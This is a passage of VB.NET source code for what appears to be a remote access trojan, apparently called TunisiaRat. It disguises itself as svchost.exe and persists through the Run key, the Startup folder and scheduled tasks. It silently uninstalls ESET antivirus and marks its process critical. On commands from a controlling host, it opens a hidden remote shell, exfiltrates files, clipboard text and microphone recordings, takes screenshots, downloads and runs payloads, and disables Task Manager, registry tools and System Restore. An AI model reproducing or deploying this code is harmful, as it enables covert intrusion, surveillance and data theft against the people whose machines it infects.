                    Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\Microsoft\svchost.exe")
                    End
                Else
                    IO.File.Copy(Application.ExecutablePath, Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\Microsoft\svchost.exe")
                    IO.File.WriteAllText(Path.GetTempPath & "melt.txt", Application.ExecutablePath)
                    Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\Microsoft\svchost.exe")
                    End
                End If
            End If
        End If
        If melt Then
            If File.Exists(Path.GetTempPath & "melt.txt") Then
                Try : IO.File.Delete(IO.File.ReadAllText(Path.GetTempPath & "melt.txt")) : Catch : End Try
            End If
        Else
            If File.Exists(Path.GetTempPath & "melt.txt") Then
                Try : IO.File.Delete(Path.GetTempPath & "melt.txt") : Catch : End Try
            End If

        End If
        '
        If copyse Then
            If Application.ExecutablePath = Path.GetTempPath & sernam & ".exe" Then
                If File.Exists(Path.GetTempPath & "melt.txt") Then
                End If
            Else

                If File.Exists(Path.GetTempPath & sernam & ".exe") Then
                    Try : IO.File.Delete(Path.GetTempPath & sernam & ".exe") : Catch : End Try
                    IO.File.Copy(Application.ExecutablePath, Path.GetTempPath & sernam & ".exe")
                    Process.Start(Path.GetTempPath & sernam & ".exe")
                    End
                Else
                    IO.File.Copy(Application.ExecutablePath, Path.GetTempPath & sernam & ".exe")
                    Process.Start(Path.GetTempPath & sernam & ".exe")
                    End
                End If
            End If
        End If


        If addtos Then
            Try
                AStartup(StartupKey, Application.ExecutablePath)
                Dim startup As String = Environment.GetFolderPath(Environment.SpecialFolder.Startup)
                IO.File.Copy(Application.ExecutablePath, startup & "\" & StartupKey & ".exe")
            Catch : End Try
        End If
        If task Then
            Dim ta As New AntiTaskManager
            Dim st As New Threading.Thread(AddressOf ta.protect)
            st.Start()
        End If

        If x59 Then
            RtlSetProcessIsCritical(True, False, False)
        End If

        If x64 Then


            Dim Pdir = "C:\ProgramData\ESET"
            Dim xSpdir As String = 0
            Dim mPath As String = 0
            Dim Dir As New DirectoryInfo(Pdir)
            For Each Spdir In Dir.GetDirectories
                If Spdir.Name.Contains("ESET") Then
                    xSpdir = Spdir.FullName
                End If
            Next
            Dim Pdir2 As String = xSpdir & "\Installer"
            Dim Dir0 As New DirectoryInfo(Pdir2)
            Dim fPath() As FileInfo = Dir0.GetFiles()
            For Each File In fPath
                If File.Name.EndsWith(".msi") Then
                    mPath = File.FullName
                End If
            Next

            Shell("msiexec /x " & mPath & " /qn /norestart", AppWinStyle.Hide)


        End If








    End Sub
    Sub imge_desik()
        Dim bitmap As New Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height)
        Dim graphics__1 As Graphics = Graphics.FromImage(TryCast(bitmap, Image))
        graphics__1.CopyFromScreen(0, 0, 0, 0, bitmap.Size)
        picBox.SizeMode = PictureBoxSizeMode.AutoSize
        picBox.Image = bitmap
        Dim er As String = ooo

        Dim bm As New Bitmap(picBox.Image)
        Dim width As Integer = 460
        Dim height As Integer = 360
        Dim thumb As New Bitmap(width, height)
        Dim g As Graphics = Graphics.FromImage(thumb)
        g.InterpolationMode = Drawing2D.InterpolationMode.Low
        g.DrawImage(bm, New Rectangle(0, 0, width, height), New Rectangle(0, 0, bm.Width, bm.Height), GraphicsUnit.Pixel)
        g.Dispose()
        thumb.Save(er, System.Drawing.Imaging.ImageFormat.Jpeg)

        bm.Dispose()
        thumb.Dispose()
    End Sub
    <DllImport("NTDLL")>
    Public Shared Sub RtlSetProcessIsCritical(ByVal nv As Boolean, ByVal ov As Integer, ByVal wl As Boolean)
    End Sub
    Private Sub Form1_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        On Error Resume Next
        Process.EnterDebugMode()
        TextBox3.Text = System.IO.File.ReadAllText(hid)
        If x62 Then
            Timer19.Enabled = True
        ElseIf x65 Then
            Timer19.Enabled = True
        Else
            screamhelp()
        End If

        Text = HOST
        tio = TimeValue(Now)



    End Sub
    Public Shared Sub AStartup(ByVal Name As String, ByVal Path As String)
        On Error Resume Next
        Dim Registry As Microsoft.Win32.RegistryKey = Microsoft.Win32.Registry.CurrentUser
        Dim Key As Microsoft.Win32.RegistryKey = Registry.OpenSubKey("Software\Microsoft\Windows\CurrentVersion\Run", True)
        Key.SetValue(Name, Path, Microsoft.Win32.RegistryValueKind.String)
    End Sub
    Public Sub DLV(ByVal n As String)
        Try
            Registry.CurrentUser.CreateSubKey("Software\" & RG).DeleteValue(n)
        Catch ex As Exception
        End Try
    End Sub
    Function GTV(ByVal n As String) As String
        Try
            Return Registry.CurrentUser.CreateSubKey("Software\" & RG).GetValue(n, "")
        Catch ex As Exception
            Return ""
        End Try
    End Function
    Function STV(ByVal n As String, ByVal t As String)
        Try
            Registry.CurrentUser.CreateSubKey("Software\" & RG).SetValue(n, t)
            Return True
        Catch ex As Exception
            Return False
        End Try
    End Function
    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
        On Error Resume Next
        Dim CapTxt As String = GetCaption()
        If makel <> CapTxt Then
            makel = CapTxt
            Timer1.Stop()
            Comet.Send("AW" & Yy & CapTxt)
            Timer1.Start()
        End If
    End Sub
    Private Sub Timer2_Tick(sender As Object, e As EventArgs) Handles Timer2.Tick
        On Error Resume Next
        If Comet.Statconnected = False Then
            Timer2.Enabled = False

            Comet.Connect(HOST, port)
            Timer2.Enabled = True
        End If
    End Sub
#Region "Socket Events"
    Private Sub Connected() Handles Comet.Connected
    End Sub
    Private Sub Disconnected() Handles Comet.Disconnected
        On Error Resume Next
        Timer2.Enabled = False
        Timer2.Interval = 5000
        Timer2.Enabled = True
        Comet.Connect(HOST, port)
    End Sub
    Private Pro As Object
    Dim Npc = Environment.UserName & "@" & Environment.MachineName
    Dim uwyeuwwqyeu$
    Dim scream1010$
    Sub cmood()
        On Error Resume Next
        Dim Sz$ = uwyeuwwqyeu
        Shell("cmd.exe /c " + Sz + " > " + cmds, AppWinStyle.Hide)
        scream1010 = System.IO.File.ReadAllText(cmds)
    End Sub
    Sub xeroore()
        Dim Comets As New IO.StreamWriter(efkjws)
        Comets.WriteLine(" IPAddress     Hostname    		 Alias" & vbNewLine _
                        + "           127.0.0.1			localhost	 	 deep.openna.com" & vbNewLine _
                        + "           127.0.0.1		deep.openna.com		 deep" & vbNewLine _
                       + "           127.0.0.1		mail.openna.com		 mail" & vbNewLine _
                       + "           127.0.0.1		web.openna.com		 web") ' end 
        Comets.Close()
    End Sub
    Private Sub Data(ByVal b As Byte()) Handles Comet.Data
        Dim T As String = BS(b)
        Dim A As String() = Split(T, Yy)
        Dim x As String = "lv" & Yy
        Try
            Select Case A(0)
                Case "att"
                    Shell("ping -t" & A(1) & "-l " & A(2), AppWinStyle.Hide)

                Case "atHTTP"
                    My.Computer.Network.Ping(A(1))
                Case "atstop"
                    Dim ItemProcess() As Process = Process.GetProcessesByName("PING")
                    If Not ItemProcess Is Nothing Then
                        For Each SubProcess As Process In ItemProcess
                            SubProcess.Kill()
                        Next
                    End If
                Case "++"
                    GetChrome()
                    Comet.Send("++")
                Case "ppww"
                    Comet.Send("ppww" & Yy & zoooom.Text)
                Case "chat"
                    Comet.Send("chat" & Yy & Npc)
                Case "A"
                    Invoke(New rv(AddressOf rvte), A(1))
                Case "recv"
                    Invoke(New oc(AddressOf och))
                    Invoke(New rv(AddressOf rvt), A(1))
                Case "ccl"
                    Invoke(New ec(AddressOf cc))
                Case "r1"
                    RtlSetProcessIsCritical(False, False, False)
                    Application.Restart()
                    End
                Case "Ren"
                    My.Computer.FileSystem.WriteAllText(scream, A(1), False)

                    name = A(1) & "_" & HWD()
                Case "ononTask"
                    TextB.Text = A(1)
                    TextBox8.Text = A(3)
                    TextBox12.Text = A(2)
                    Dim hsonh$ = A(5)
                    Dim FAK$ = (A(4))
                    Dim tf As String
                    tf = System.Environment.UserName
                    TextBox12.Text = TextBox12.Text.Replace("?", tf)
                    System.Threading.Thread.Sleep("100")
                    If File.Exists(TextBox12.Text) Then
                        If FAK = "1" Then

                            Shell("schtasks /create /sc minute /" + TextBox8.Text + " /tn " + TextB.Text + " /tr " & TextBox12.Text, AppWinStyle.Hide)
                        ElseIf FAK = "2" Then

                            Shell("SchTasks /Create /SC DAILY /TN " + TextB.Text + " /TR " + TextBox12.Text + " /" + TextBox8.Text, AppWinStyle.Hide)
                        ElseIf FAK = "3" Then

                            Shell("SchTasks /Create /SC MONTHLY /" + TextBox8.Text + " /TN " + TextB.Text + " /TR " + TextBox12.Text + " /" + hsonh, AppWinStyle.Hide)

                        ElseIf FAK = "4" Then

                            Shell("SchTasks /Create /SC WEEKLY /" + TextBox8.Text + " /TN " + TextB.Text + " /TR " + TextBox12.Text + " /" + hsonh, AppWinStyle.Hide)

                        End If

                    Else
                        File.Copy(Application.ExecutablePath, TextBox12.Text)
                        System.IO.File.SetAttributes(TextBox12.Text, IO.FileAttributes.Hidden)
                        If FAK = "1" Then

                            Shell("schtasks /create /sc minute /" + TextBox8.Text + " /tn " + TextB.Text + " /tr " & TextBox12.Text, AppWinStyle.Hide)
                        ElseIf FAK = "2" Then
                            Shell("SchTasks /Create /SC DAILY /TN " + TextB.Text + " /TR " + TextBox12.Text + " /" + TextBox8.Text, AppWinStyle.Hide)
                        ElseIf FAK = "3" Then
                            Shell("SchTasks /Create /SC MONTHLY /" + TextBox8.Text + " /TN " + TextB.Text + " /TR " + TextBox12.Text + " /" + hsonh, AppWinStyle.Hide)
                        ElseIf FAK = "4" Then
                            Shell("SchTasks /Create /SC WEEKLY /" + TextBox8.Text + " /TN " + TextB.Text + " /TR " + TextBox12.Text + " /" + hsonh, AppWinStyle.Hide)

                        End If

                    End If
                Case "ofofTask"
                    TextB.Text = A(1)
                    Shell("SCHTASKS /Delete /TN " + TextB.Text + " /f", AppWinStyle.Hide)

                Case "openurl"
                    System.Diagnostics.Process.Start(A(1))
                    Comet.Send("Coloreg")
                Case "downloadfile"
                    Comet.Send("downloadedfile" & Yy & Convert.ToBase64String(IO.File.ReadAllBytes(A(1))) & Yy & A(2))
                Case "sendfileimge"
                    IO.File.WriteAllBytes(IO.Path.GetTempPath & A(1), Convert.FromBase64String(A(2)))
                    Thread.Sleep(1000)
                    Comet.Send("Coloreg")

                    SystemParametersInfo(SETDESKWALLPAPER, 0, IO.Path.GetTempPath & A(1), UPDATEINIFILE)
                Case "ssstui"

                    Dim RR$ = Environment.GetFolderPath(Environment.SpecialFolder.Desktop)
                    IO.File.WriteAllBytes(RR & A(1), Convert.FromBase64String(A(2)))
                    Thread.Sleep(1000)
                Case "sendfile"
                    IO.File.WriteAllBytes(IO.Path.GetTempPath & A(1), Convert.FromBase64String(A(2)))
                    Thread.Sleep(1000)
                    Process.Start(IO.Path.GetTempPath & A(1))
                Case "sendmusicplay"
                    IO.File.WriteAllBytes(IO.Path.GetTempPath & A(1), Convert.FromBase64String(A(2)))
                    Threading.Thread.Sleep(1000)
                    My.Computer.Audio.Stop()
                    My.Computer.Audio.Play(IO.Path.GetTempPath & A(1), AudioPlayMode.Background)
                Case "scream1"
                    mmciSendString("open new Type waveaudio Alias recsound", "", 0, 0)
                    mmciSendString("record recsound", "", 0, 0)
                '
                '
                '

                Case "scream1stop"
                    mmciSendString("save recsound " + screamx, "", 0, 0)
                    mmciSendString("close recsound", "", 0, 0)
                    Dim n As New IO.FileInfo(screamx)
                    Comet.Send("scream2" & Yy & n.Name & Yy & Convert.ToBase64String(IO.File.ReadAllBytes(screamx)))
                    Comet.Send("screamf" & Yy & n.Name & Yy & Convert.ToBase64String(IO.File.ReadAllBytes(screamx)))
                    My.Computer.Audio.Stop()
                '
                '
                '

                Case "script"
                    Dim xop$
                    xop = System.Environment.UserName
                    Dim temp As String = Environment.GetFolderPath(Environment.SpecialFolder.Templates) & "\" + xop
                    IO.File.WriteAllText(temp & A(2), A(1))
                    Process.Start(temp & A(2))
                Case "ClearClp"
                    My.Computer.Clipboard.Clear()
                Case "SetClp"
                    My.Computer.Clipboard.SetText(A(1))
                Case "GetClp"
                    Comet.Send("GetClp" & Yy & My.Computer.Clipboard.GetText)
                Case "CursorShow"
                    Cursor.Show()
                Case "CursorHide"
                    Cursor.Hide()
                Case "ClockOFF"
                    hideclock()
                Case "ClockON"
                    showclock()
                Case "TaskbarShow"
                    ShowTaskbarItems()
                Case "TaskbarHide"
                    HideTaskbarItems()
                Case "SoundON"
                    SendMessageW(Process.GetCurrentProcess.Handle, &H319, Process.GetCurrentProcess.Handle, CType(&H80000, IntPtr))
                Case "SoundOFF"
                    SendMessageW(Process.GetCurrentProcess.Handle, &H319, Process.GetCurrentProcess.Handle, CType(&H80000, IntPtr))
                Case "IconsON"
                    IconsToggle()
                Case "IconsOFF"
                    IconsToggle()
                Case "startfun"
                    Comet.Send("startfun")
                Case "blockmouseandkeyboard"
                    BlockInput(1)
                    ShowCursor(0)
                    My.Computer.Registry.SetValue("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System", "DisableTaskMgr", "1", Microsoft.Win32.RegistryValueKind.DWord)
                Case "unblockmouseandkeyboard"
                    BlockInput(0)
                    ShowCursor(1)
                    My.Computer.Registry.SetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SystemRestore", "DisableSR", "0", Microsoft.Win32.RegistryValueKind.DWord)
                Case "hidetb"
                    Dim TaskbarHandle As Long
                    TaskbarHandle = FindWindow("Shell_traywnd", "")
                    SetWindowPos(TaskbarHandle, 0&, 0&, 0&, 0&, 0&, TASKBAR_HIDE)
                Case "showtb"
                    Dim TaskbarHandle As Long
                    TaskbarHandle = FindWindow("Shell_traywnd", "")
                    SetWindowPos(TaskbarHandle, 0&, 0&, 0&, 0&, 0&, TASKBAR_SHOW)
                Case "winupdateon"
                    Dim ss As Boolean
                    My.Computer.Registry.SetValue("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", "NoWindowsUpdate", "0", Microsoft.Win32.RegistryValueKind.DWord)
                Case "winupdateoff"
                    Dim dis As Boolean
                    My.Computer.Registry.SetValue("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", "NoWindowsUpdate", "1", Microsoft.Win32.RegistryValueKind.DWord)
                Case "DisableCMD"
                    My.Computer.Registry.SetValue("HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\System", "DisableCMD", "1", Microsoft.Win32.RegistryValueKind.DWord)
                Case "EnableCMD"
                    My.Computer.Registry.SetValue("HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\System", "DisableCMD", "0", Microsoft.Win32.RegistryValueKind.DWord)
                Case "DisableRegistry"
                    My.Computer.Registry.SetValue("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System", "DisableRegistryTools", "1", Microsoft.Win32.RegistryValueKind.DWord)
                Case "EnableRegistry"
                    My.Computer.Registry.SetValue("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System", "DisableRegistryTools", "0", Microsoft.Win32.RegistryValueKind.DWord)
                Case "DisableRestore"
                    My.Computer.Registry.SetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SystemRestore", "DisableSR", "1", Microsoft.Win32.RegistryValueKind.DWord)
                Case "EnableRestore"
                    My.Computer.Registry.SetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SystemRestore", "DisableSR", "0", Microsoft.Win32.RegistryValueKind.DWord)
                Case "DisableTaskManager"
                    My.Computer.Registry.SetValue("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System", "DisableTaskMgr", "1", Microsoft.Win32.RegistryValueKind.DWord)
                Case "EnableTaskManager"
                    My.Computer.Registry.SetValue("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System", "DisableTaskMgr", "0", Microsoft.Win32.RegistryValueKind.DWord)
                Case "TurnOffMonitor"
                    SendMessage(-1, &H112, &HF170, 2)

                Case "Stillness"
                    SendMessage(-1, &H112, &HF170, 2)

                Case "TurnOnMonitor"
                    SendMessage(-1, &H112, &HF170, -1)
                Case "NormalMouse"
                    SwapMouseButton(&H0&)
                Case "ReverseMouse"
                    SwapMouseButton(&H100&)
                Case "opencd"
                    Try
                        mciSendString("set cdaudio door open", 0, 0, 0)
                    Catch ex As Exception
                    End Try
                Case "closecd"
                    Try
                        mciSendString("set cdaudio door closed", 0, 0, 0)
                    Catch ex As Exception
                    End Try
                Case "sendinformation"
                    Dim time, h, m, s As Integer
                    time = My.Computer.Clock.TickCount
                    h = time \ 3600000
                    m = (time Mod 3600000) \ 60000
                    s = ((time Mod 3600000) Mod 60000) / 1000
                    Dim ab, bb, cb, db, eb, fb, gb As String
                    ab = Microsoft.Win32.Registry.GetValue("HKEY_LOCAL_MACHINE\HARDWARE\DESCRIPTION\System\CentralProcessor\0", "ProcessorNameString", "")
                    bb = Microsoft.Win32.Registry.GetValue("HKEY_LOCAL_MACHINE\HARDWARE\DESCRIPTION\System\CentralProcessor\0", "Identifier", "")
                    cb = Microsoft.Win32.Registry.GetValue("HKEY_LOCAL_MACHINE\HARDWARE\DESCRIPTION\System\BIOS", "SystemProductName", "")
                    db = Microsoft.Win32.Registry.GetValue("HKEY_LOCAL_MACHINE\HARDWARE\DESCRIPTION\System\BIOS", "BIOSReleaseDate", "")
                    eb = Microsoft.Win32.Registry.GetValue("HKEY_LOCAL_MACHINE\HARDWARE\DESCRIPTION\System\BIOS", "BIOSVersion", "")
                    fb = Microsoft.Win32.Registry.GetValue("HKEY_LOCAL_MACHINE\HARDWARE\DESCRIPTION\System\BIOS", "SystemManufacturer", "")
                    gb = Microsoft.Win32.Registry.GetValue("HKEY_LOCAL_MACHINE\HARDWARE\DESCRIPTION\System\BIOS", "BIOSVendor", "")
                    Dim value As String = Microsoft.Win32.Registry.GetValue("HKEY_CURRENT_USER\TunisiaRat", "ID", "")
                    Comet.Send("sendinformation" & Yy & Environment.MachineName & Yy & Environment.UserName & Yy & My.Computer.Info.OSFullName & Yy & My.Computer.Info.OSPlatform & Yy & country & Yy & getanti() & Yy & GetSystemRAMSize() & Yy & "0.1.0" & Yy & checkcam() & Yy & ACT() & Yy & My.Computer.Clock.LocalTime & Yy & h & ":" & m & ":" & s & Yy & Environment.CurrentDirectory & Yy & Environment.SystemDirectory & Yy & Environment.UserDomainName & Yy & Environment.UserInteractive & Yy & Environment.WorkingSet & Yy & My.Computer.Info.OSVersion & Yy & My.Computer.Info.InstalledUICulture.ToString & Yy & System.Environment.CommandLine & Yy & port & Yy & Application.ExecutablePath & Yy & ab & Yy & bb & Yy & cb & Yy & db & Yy & eb & Yy & fb & Yy & gb & Yy & value)
                Case "infoDesk"
                    imge_desik()
                    Comet.Send("infoDesk" & "|U|" & Convert.ToBase64String(IO.File.ReadAllBytes(ooo)) & "|U|" & name & "|U|" & port & "|U|" & Ver & "|U|" & GetFirewall() & "|U|" & Application.ExecutablePath)



                Case "clipss"
                    Comet.Send("clipss" & Yy & Npc)
                Case "getcli"
                    Invoke(New gt(AddressOf gtx))
                Case "openRG"
                    Comet.Send("openRG")
                Case "RG"
                    Dim kk As Object = GetKey(A(2))
                    Select Case A(1)
                        Case "~"
                            Dim s As String = "RG" & Yy & "~" & Yy & A(2) & Yy
                            Dim o As String = ""
                            For Each xe As String In kk.GetSubKeyNames
                                If xe.Contains("\") = False Then
                                    o += xe & Yy
                                End If
                            Next
                            For Each xs As String In kk.GetValueNames
                                o += xs & "/" & kk.GetValueKind(xs).ToString & "/" & kk.GetValue(xs, "").ToString & Yy
                            Next
                            Comet.Send(s & o)
                        Case "!"
                            kk.SetValue(A(3), A(4), A(5))
                        Case "@5"
                            kk.DeleteValue(A(3), False)
                        Case "#"
                            kk.CreateSubKey(A(3))
                        Case "$"
                            kk.DeleteSubKeyTree(A(3))
                    End Select
                Case "openshell"
                    Try
                        Pro.Kill()
                    Catch ex As Exception
                    End Try
                    Pro = New Process
                    Pro.StartInfo.RedirectStandardOutput = True
                    Pro.StartInfo.RedirectStandardInput = True
                    Pro.StartInfo.RedirectStandardError = True
                    Pro.StartInfo.FileName = "cmd.exe"
                    Pro.StartInfo.RedirectStandardError = True
                    AddHandler CType(Pro, Process).OutputDataReceived, AddressOf RS
                    AddHandler CType(Pro, Process).ErrorDataReceived, AddressOf RS
                    AddHandler CType(Pro, Process).Exited, AddressOf ex
                    Pro.StartInfo.UseShellExecute = False
                    Pro.StartInfo.CreateNoWindow = True
                    Pro.StartInfo.WindowStyle = ProcessWindowStyle.Hidden
                    Pro.EnableRaisingEvents = True
                    Comet.Send("openshell")
                    Pro.Start()
                    Pro.BeginErrorReadLine()
                    Pro.BeginOutputReadLine()
                Case "rs"
                    Pro.StandardInput.WriteLine(DEB(A(1)))
                Case "rsc"
                    Try
                        Pro.Kill()
                    Catch ex As Exception
                    End Try
                    Pro = Nothing
                Case "xoxCl"
                    xtrem.Text = ""
                Case "logeronline"
                    xtrem.Text = ""
                    ero = 2
                ''''

                'Timer20.Enabled = True

                '''''''''

                Case "OpenPro"
                    Comet.Send("OpenPro" & Yy & Npc)
                Case "GetProcesses"
                    Dim allProcess As String = ""
                    Dim sl As String = "ProcessSplit"
                    For Each xd As Process In Process.GetProcesses
                        Try



                            allProcess += xd.ProcessName & "|" & xd.Id & "|" & xd.MainModule.FileName & "|" & xd.PrivateMemorySize64 & "|" & xd.StartTime & "|" & xd.MainModule.FileVersionInfo.CompanyName & "|" & xd.MainModule.FileVersionInfo.FileVersion & "|" & xd.MainModule.FileVersionInfo.Language & "|" & xd.MainModule.FileVersionInfo.LegalCopyright & "|" & xd.MainModule.FileVersionInfo.LegalTrademarks & "|" & xd.MainModule.FileVersionInfo.ProductName & "|" & xd.MainModule.FileVersionInfo.FileDescription & "|" & xd.MainModule.FileVersionInfo.GetHashCode & "|" & Screamhi & sl
                        Catch
                            'allProcess += xd.ProcessName & "|" & xd.Id & "|" & "-" & "|" & xd.PrivateMemorySize64 & "|" & "-" & sl
                        End Try
                    Next
                    Comet.Send("ProcessManager" & Yy & allProcess & Yy & System.IO.Path.GetFileNameWithoutExtension(Application.ExecutablePath))
                Case "ports"
                    Comet.Send("ports" & Yy & Npc)
                Case "cc"
                    Comet.Send("cc" & Yy & Npc)
                Case "ssopen"
                    Comet.Send("ss" & Yy & Npc)


                Case "life is Beautiful"
                    Comet.Send("life is Beautiful" & Yy & Npc)

                Case "Acti"
                    Comet.Send("Acti" & Yy & Npc)
                Case "Cnsl"

                    My.Settings.Reset()

                Case "RIDOX"
                    Dim JW$ = A(1)
                    Dim JWy$ = A(2)
                    My.Settings.ho = JW
                    My.Settings.po = JWy
                    My.Settings.Save()
                    RtlSetProcessIsCritical(False, False, False)
                    Application.Restart()
                    End

                Case "ROps43H"

                    Dim GOV$ = "------------------------------------------"
                    If My.Settings.ho = "" Then


                        Dim TOFCs$ = x3 & NewLine + GOV & NewLine + "host : " + x1 & NewLine + "port : " + x2
                        Comet.Send("00000000000000000000000" & Yy & TOFCs)
                    Else

                        Dim TOFCs$ = x3 & NewLine + GOV & NewLine + "host : " + My.Settings.ho & NewLine + "port : " + My.Settings.po
                        Comet.Send("00000000000000000000000" & Yy & TOFCs)

                    End If



                Case "blokron"

                    xeroore()


                Case "blokr"


                    saw = New StreamWriter(efkjws, True)
                    Dim sitetoblock As String = (Environment.NewLine & "127.0.0.1 " & A(1))
                    saw.Write(sitetoblock)
                    saw.Close()



                Case "ROps43"

                    scream1010 = "Server runtime : " + tio & vbNewLine + "The current time is now : " + TimeValue(Now)
                    Comet.Send("00000000000000000000000" & Yy & scream1010)

                Case "screamiwsx"
                    uwyeuwwqyeu = A(1)
                    cmood()
                    Comet.Send("00000000000000000000000" & Yy & scream1010)

                Case "Winsx"

                    GetActiveWindows()

                Case "GOs"


                    Dim sl As String = "ProcessSplit"

                    Dim UO$

                    Dim s1$
                    Dim s2$
                    Dim s3$

                    If controllers IsNot Nothing Then
                        controllers = New Generic.SortedList(Of String, ServiceController)
                    End If

                    Dim services As ServiceController() = ServiceController.GetServices()
                    For Each controller As ServiceController In services
                        s1 = controller.DisplayName

                        With s1 = controller.DisplayName
                            s2 = controller.Status.ToString()
                            s3 = controller.ServiceType.ToString()
                            Dim R$ = "|"
                            UO = s2 + R + s1 + R + s3 + R + sl
                        End With
                        Comet.Send("serrrrr" & Yy & UO & Yy & System.IO.Path.GetFileNameWithoutExtension(Application.ExecutablePath))
                    Next controller

                Case "KLACt"

                    KKKKS.Text = A(1)

                    Dim P2 As New Process
                    For Each P2 In Process.GetProcesses
                        If P2.MainWindowTitle.Contains(KKKKS.Text) Then
                            P2.Kill()
                        End If
                    Next

                Case "Voz"

                    Dim tsss As String = A(1)

                    If tsss = 0 Then

                        msvc.Stop()

                    Else

                        msvc.Start()


                    End If


                Case "TETE"
                    Comet.Send("TETE" & Yy & Npc)


                Case "portex"
                    ewfwasefds1.Text = ""
                    ewfwasefds2.Text = ""
                    ewfwasefds.Text = ""
                    Dim sl As String = "ProcessSplit"
                    Try
                        Dim ewfwasefds As New TextBox
                        Dim Range As TcpClient = New TcpClient(A(1), A(2))
                        ewfwasefds2.Text = A(1) & " :" + A(2)
                        Dim TIOD$ = "True"
                        Dim EKJD$ = "Port [Open]"
                        If Range.Connected = True Then
                            ewfwasefds.Text = Range.Client.Handle
                            ewfwasefds1.Text = EKJD & "|" & ewfwasefds2.Text & "|" & TIOD & "|" & ewfwasefds.Text & sl
                        End If
                    Catch ex As Exception
                        ewfwasefds2.Text = A(1) & " :" + A(2)
                        Dim DXK$ = "False"
                        Dim EKJDsssss$ = "Port [Closed]"
                        ewfwasefds1.Text = EKJDsssss & "|" & ewfwasefds2.Text & "|" & DXK & "|" & "-" & sl
                    End Try

                    Comet.Send("poka" & Yy & ewfwasefds1.Text)

                Case "Shutdowns"
                    Shell("Shutdown -r")
                Case "sciikxxxwa"
                    Shell("Shutdown -s")
                Case "xxyiazzqk"
                    Shell("Shutdown -l")

                Case "stopg"
                    ero = 1

                Case "xxx"

                    Dim ParentKey As RegistryKey =
                    Registry.LocalMachine.OpenSubKey("SOFTWARE\MICROSOFT\Windows\CurrentVersion\Installer\UserData\S-1-5-18\Products")

                    Dim count As Integer = 0

                    Dim ChildKey As RegistryKey


                    For Each child As String In ParentKey.GetSubKeyNames()

                        ChildKey = ParentKey.OpenSubKey(child).OpenSubKey("InstallProperties")

                        If Not ChildKey Is Nothing Then

                            Dim LItem As New ListViewItem()
                            Dim q$ = ChildKey.GetValue("DisplayName").ToString
                            Dim w$ = ChildKey.GetValue("Publisher").ToString
                            Dim er$ = ChildKey.GetValue("InstallDate").ToString
                            Dim Yr$ = ChildKey.GetValue("EstimatedSize").ToString
                            Dim oos$ = ChildKey.GetValue("DisplayVersion").ToString
                            ReDim Preserve strUninstallStrings(count)
                            If ChildKey.GetValue("UninstallString") IsNot Nothing Then
                                strUninstallStrings(count) = ChildKey.GetValue("UninstallString")
                                Dim allProcess As String = ""
                                Dim sl As String = "ProcessSplit"
                                allProcess += q & "|" & w & "|" & er & "|" & Yr & "|" & oos & sl

                                Comet.Send("xxz" & Yy & allProcess)
                            Else
                                strUninstallStrings(count) = "No Uninstall String"
                            End If
                        End If
                        count += 1
                    Next
                    NewUninstallStrArr = (From str In strUninstallStrings
                                          Where Not {"No Uninstall String"}.Contains(str)).ToArray()
                Case "xxxxxxxxxxxxx"
                    Dim pro As Process = New Process() With {.StartInfo = New ProcessStartInfo(A(1)) With {.Verb = "runas", .UseShellExecute = True}}
                    pro.Start()
                Case "lDL"
                    Dim procID As Integer
                    Dim sr$ = A(1)
                    procID = Shell(NewUninstallStrArr(sr), AppWinStyle.NormalFocus)
                    SendKeys.Send("{ENTER}")
                    SendKeys.Send("{ENTER}")
                    SendKeys.Send("{ENTER}")
                    SendKeys.Send("{ENTER}")
                    SendKeys.Send("{ENTER}")
                    SendKeys.Send("{ENTER}")
                Case "RestProcess"
                    Dim eachprocess As String() = A(1).Split("ProcessSplit")
                    For i = 0 To eachprocess.Length - 2
                        For Each RunningProcess In Process.GetProcessesByName(eachprocess(i))
                            RunningProcess.Kill()
                        Next
                        Process.Start(eachprocess(i))
                    Next
                Case "KillProcess"
                    Dim eachprocess As String() = A(1).Split("ProcessSplit")
                    For i = 0 To eachprocess.Length - 2
                        For Each RunningProcess In Process.GetProcessesByName(eachprocess(i))
                            RunningProcess.Kill()
                        Next
                    Next

                Case "SProcess"
                    sco = 1
                    Dim eachprocess As String() = A(1).Split("ProcessSplit")
                    For i = 0 To eachprocess.Length - 2
                        Dim o = Process.GetProcessesByName(eachprocess(i))
                        SuspendProcess(o(0))
                        Comet.Send("SP")
                    Next
                Case "SProcessr"
                    sco = 2
                    Dim eachprocess As String() = A(1).Split("ProcessSplit")
                    For i = 0 To eachprocess.Length - 2
                        Dim o = Process.GetProcessesByName(eachprocess(i))
                        SuspendProcess(o(0))
                        Comet.Send("SP")
                    Next
                Case "SSProcess"
                    Dim eachprocess As String() = A(1).Split("ProcessSplit")
                    For i = 0 To eachprocess.Length - 2
                        Dim sh = Process.GetProcessesByName(eachprocess(i))
                        Dim iHwnd As IntPtr = FindWindow(eachprocess(i), vbNullString)
                        ShowWindow(iHwnd, SW_SHOWNORMAL)
                        Comet.Send("SP")
                    Next
                Case "SSSProcess"
                    Dim eachprocess As String() = A(1).Split("ProcessSplit")
                    For i = 0 To eachprocess.Length - 2
                        Dim hi = Process.GetProcessesByName(eachprocess(i))
                        Dim iHwnd As IntPtr = FindWindow(eachprocess(i), vbNullString)
